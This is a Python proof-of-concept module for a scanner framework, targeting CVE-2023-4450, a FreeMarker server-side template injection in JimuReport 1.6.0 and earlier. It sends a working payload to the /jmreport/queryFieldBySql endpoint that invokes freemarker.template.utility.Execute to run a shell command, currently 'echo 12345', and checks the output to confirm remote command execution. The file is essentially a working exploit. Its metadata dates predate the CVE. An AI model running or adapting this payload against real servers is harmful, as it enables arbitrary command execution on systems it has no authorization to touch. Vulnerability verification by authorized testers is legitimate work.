# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "JimuReport FreeMarker 服务端模板注入命令执行（CVE-2023-4450）",                        # 漏洞名称
        "VulnID" : "CVE-2023-4450",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "JimuReport",                     # 漏洞应用名称
        "AppVersion" : "JimuReport <= 1.6.0",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            积木报表（JimuReport）是一个开源的数据可视化报表平台。在其1.6.0版本及以前，存在一个FreeMarker服务端模板注入（SSTI）漏洞，攻击者利用该漏洞可在服务器中执行任意命令。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/jmreport/queryFieldBySql" # url自己按需调整
        body="""
{"sql":"select 'result:<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ex(\\\"echo 12345\\\")}'" }"""

        headers = {
                    "User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,data=body,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code == 200 and "application/json" in req.headers["Content-Type"] and "result: 12345" in req.text and "timestamp" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()